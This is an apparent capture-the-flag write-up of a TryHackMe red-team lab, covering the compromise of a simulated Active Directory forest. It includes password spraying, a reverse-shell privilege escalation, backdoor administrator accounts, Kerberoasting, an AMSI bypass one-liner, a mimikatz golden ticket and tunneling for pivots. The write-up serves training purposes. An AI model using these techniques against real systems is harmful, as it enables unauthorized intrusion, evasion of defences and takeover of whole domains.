# A Walkthrough of The RedTeam Capstone Challenge
...
[3] Exit
Selection:1
Please provide your THM username: neha149
Creating email user
...
MailAddr: neha149@corp.th3reserve.loc
...
| Name | Role |
|---|---|
| Aimee Walker | Lead Developer |
| Patrick Edwards | Lead Developer |
...
| Charlene Thomas | CMO |
| Rhys Parsons | COO |
| Lynda Gordon | PA to the Executives |
...
There is an exposed PHP info file that is leaking so much info about this web server. Using a plugin for the browser called Wappalyzer, we can check on the technologies used by the server, including their versions. October CMS is being used, so let's brute force its directory.
...
This looks intresting `http://10.200.x.13/october/modules/`

Going through the backend files, it tells us that there is an administration panel, with the help of brute forcing and guessing, I was able to discover the correct path for the administration panel.
...
We do not have username and password yet. Continue enumeration.
...
```bash
Nmap 7.93 scan initiated Sat May 13 14:29:54 2023 as: nmap -p- --min-rate 5000 -oN scans/nmap_alltcp.md 10.200.103.12
```
...
Nmap done at Sat May 13 14:30:05 2023 -- 1 IP address (1 host up) scanned in 11.71 seconds
```
...
We have new IP, scan this subnet with Nmap.
...
```bash
Nmap 7.93 scan initiated Sat May 13 12:22:57 2023 as: nmap -p- --min-rate 5000 -oN scans/nmap_alltcp 10.200.103.11
```
...
| pop3-capabilities: UIDL USER TOP
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open   imap          hMailServer imapd
| imap-capabilities: ACL completed IMAP4 CAPABILITY NAMESPACE CHILDREN OK RIGHTS=texkA0001 SORT QUOTA IMAP4rev1 IDLE
445/tcp   open   microsoft-ds?
...
| ssl-date: 2024-05-20T13:38:04+00:00; -1s from scanner time.
| rdp-ntlm-info:
...
At the beginning of the challenge, we have been provided with `password_base_list.txt` that contains some sample passwords:
...
We try creating our password list.
...
We have info about the team working for the Reserve company and already know the email format that is being used. Let's create our email wordlist and start the attack.
...
using Hydra tool for this attack
...
there are no emails in their inbox, spray creds on the available services.
...
####  Enumeration of pawned machines
...
#### PowerView
 ...
 WRK1 and WRK2 machines have Windows Defender installed and enabled.
...
name                   : Help Desk
member                 : {CN=Mohammad Ahmed,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc, CN=Keith Allen,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc, CN=Ashley Chan,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc, CN=Emily Harvey,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc...}
...
"Backup Service" in the root directory of `C:` has an executable file called `backup.exe`.
...
This service is being executed with Local System permission, and it is vulnerable to unquoted service paths. Priv Esc

Priv Esc - https://github.com/izenynn/c-reverse-shell
...
We are now having local admin privileges on the WRK1 machine.
...
```cmd
C:\Windows\system32>net user neha 'hacker123' /add
net user neha 'hacker123' /add
The command completed successfully.

C:\Windows\system32>net localgroup Administrators neha /add
net localgroup Administrators neha /add
The command completed successfully.

C:\Windows\system32>net localgroup "Remote Desktop Users" neha /add
net localgroup "Remote Desktop Users" neha /add
The command completed successfully.
```
...
Using the PowerShell script, `Invoke-Kerberoast` from the Empire project, which can be loaded directly into memory (`ik.ps1` == `Invoke-Kerberoast.ps1`):
...
```
$krb5tgs$23$*svcScanning$corp.thereserve.loc$cifs/scvScanning*$<hash omitted for length>:Password1!
```
...
```
SMB         10.200.x.21   445    WRK1             [+] corp.thereserve.loc\svcScanning!
```

### BloodHound

 let's gather more info about AD using bloodhound
...
Found an obfuscated version of SharpHound that worked with me in this repo: `GitHub - Flangvik/ObfuscatedSharpCollection`

**AMSI Bypass**

```powershell
PS C:> $v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."GetField"('ams' + 'iInitFailed','NonPublic,Static')."SetValue"($null,$true)
```
...
It seems that the `svcScanning` user is a member of `services@corp.thereserve.loc` and has the permission to execute remote PowerShell commands on the `server2.corp.thereserve.loc` computer.
...
As per BloodHound's output, let's  execute remote commands on the Server2 machine:
...
ECDSA key fingerprint is SHA256+zTPNkk9edAkZVP6DZxa7hSuls.
...
we can RDP to the DC machine, and we are now Domain Admins and OWN the whole Domain. We get the flags.
...
As the CORP child trusts the ROOT domain and the BANK domain also trusts the ROOT domain, then both the CORP and BANK domains will trust each other as the trust type is transitive. Therefore, if we compromise a child domain, we can access the other child domain.
...
Privilege '20' OK
mimikatz : kerberos::golden /user /domain.thereserve.loc /sid /service /rc4:0c757a3445acb94a654554f3ac529ede /sids /ptt
User      : Administrator
...
now we have administrative access on the RootDC machine "the parent domain". We get the flags.
...
```cmd
C:\Users\Administrator.CORP>net user neha "Password1!" /domain
The command completed successfully

C:\Users\Administrator.CORP>net group "Enterprise Admins" neha /add /domain
The command completed successfully.
```
...
```bash
┌──(root㉿kali)-[~]
└─$ proxychains -q evil-winrm -i 10.200.x.100 -u neha -p 'Password1!'
```
...
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
Evil-WinRM PS C:\Users\neha\Documents> hostname
ROOTDC
```

### Port Forwarding

We are now having access to the ROOTDC therefore, from here we can access the child domain `BANK.thereserve.loc`, but we can't access it directly from our own attacking machine. Therefore, we need to establish tunneling from the ROOTDC. We are assigned two interfaces, one for the TryHackMe VPN and the other for the Corp VPN, from that, we previously accessed the internal network.
...
inet6 fe80::4eaf:39ba:b250  prefixlen 64  scopeid 0x20<link>
unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
...
tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
inet 12.100.1.x  netmask 255.255.255.0  destination 12.100.1.x
inet6 fe80::90f7:43f8:282d  prefixlen 64  scopeid 0x20<link>
unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
...
```powershell
Evil-WinRM PS C:\Users\neha\Documents> ping 10.50.87.39
```
...
```powershell
Evil-WinRM PS C:\Users\neha\Documents> ssh tunneluser@10.50.87.39 -R 9060 -N
```
...
```bash
┌──(root㉿kali)-[/]
└─$ proxychains -q -f proxychains4.conf xfreerdp /u:neha /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.101
```
...
Connecting again with the administrator user. Note: two proxies are being used — the first tunneling traffic from WRK1/WRK2 to my attacking machine (direct access to the SERVERs and DC), the other from ROOTDC to my attacking machine (direct access to the `bank.thereserve.loc` child domain).
...
Since we have an administrator account, all child domains are owned now and we get the flags.
